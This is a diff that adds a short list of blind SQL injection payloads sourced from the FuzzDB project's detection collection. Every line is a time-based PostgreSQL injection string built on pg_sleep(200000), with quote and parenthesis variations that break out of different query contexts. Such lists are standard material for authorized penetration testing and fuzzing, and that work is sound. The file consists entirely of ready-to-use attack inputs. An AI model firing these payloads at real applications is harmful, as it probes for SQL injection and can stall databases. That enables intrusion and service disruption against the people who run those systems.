@@ -1,0 +1,12 @@
+# Source: FuzzDB (https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/sql-injection/detect/GenericBlind.txt)
+
+pg_sleep(200000)--
+1 or pg_sleep(200000)--
+" or pg_sleep(200000)--
+' or pg_sleep(200000)--
+1) or pg_sleep(200000)--
+") or pg_sleep(200000)--
+') or pg_sleep(200000)--
+1)) or pg_sleep(200000)--
+")) or pg_sleep(200000)--
+')) or pg_sleep(200000)--
